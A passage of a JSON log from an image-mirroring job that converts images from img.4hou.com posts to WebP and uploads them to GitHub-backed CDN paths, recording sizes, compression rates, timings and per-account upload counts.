KB","compressRate":"60.1%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239249438223.jpeg","sourceStatusCode":200,"destWidth":687,"destHeight":608,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn77@2020_1/2020/09/05/07-31-31-319_f41776970cad6469.webp","sourceBytes":39032,"destBytes":34202,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6934,"convertSpendMs":17,"createdTime":"2020-09-05 15:31:25","host":"us-54*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"38.1 KB","destSize":"33.4 KB","compressRate":"87.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599191166115134.gif","sourceStatusCode":200,"destWidth":639,"destHeight":389,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn42@2020_2/2020/09/05/07-31-33-279_565d850af2b0b8f7.webp","sourceBytes":530611,"destBytes":164168,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":19620,"convertSpendMs":607,"createdTime":"2020-09-05 15:31:15","host":"us-026*","referer":"https://www.4hou.com/posts/wZNw","linkMd5ListStr":"b6031335b5a855e88d6461fc3df32e2f","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"518.2 KB","destSize":"160.3 KB","compressRate":"30.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102000648897.png","sourceStatusCode":200,"destWidth":1207,"destHeight":830,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn93@2020_2/2020/09/05/07-31-43-981_a80ecbde3f348a0f.webp","sourceBytes":34187,"destBytes":27496,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":26345,"convertSpendMs":25,"createdTime":"2020-09-05 15:31:18","host":"us-032*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"33.4 KB","destSize":"26.9 KB","compressRate":"80.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192117176581.png","sourceStatusCode":200,"destWidth":1112,"destHeight":973,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn57@2020_6/2020/09/05/07-32-34-081_c3b6eaa8382735ac.webp","sourceBytes":183190,"destBytes":110742,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":10154,"convertSpendMs":39,"createdTime":"2020-09-05 15:32:25","host":"europe-22*","referer":"https://www.4hou.com/posts/lDyl","linkMd5ListStr":"04a80f6b7974cfbb572ac23346ea5ec8","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"178.9 KB","destSize":"108.1 KB","compressRate":"60.5%"}],"successGithubMap":{"myreaderx8":5,"myreaderx15":4,"myreaderx7":4,"myreaderx6":4,"myreaderx16":4,"myreaderx4":5,"myreaderx10":5,"myreaderx32":5,"myreaderx3":4,"myreaderx33":5,"myreaderx11":4,"myreaderx2":5,"myreaderx12":5,"myreaderx1":4,"myreaderx13":4,"myreaderx30":4,"myreaderx31":3,"myreaderx18":3,"myreaderx19":2,"myreaderx":4,"myreaderx25":5,"myreaderx27":4,"myreaderx21":4,"myreaderx22":3,"myreaderx24":5,"myreaderx5oss":4,"myreaderx29":4},"failGithubMap":{"myreaderx14":4,"myreaderx23":3}}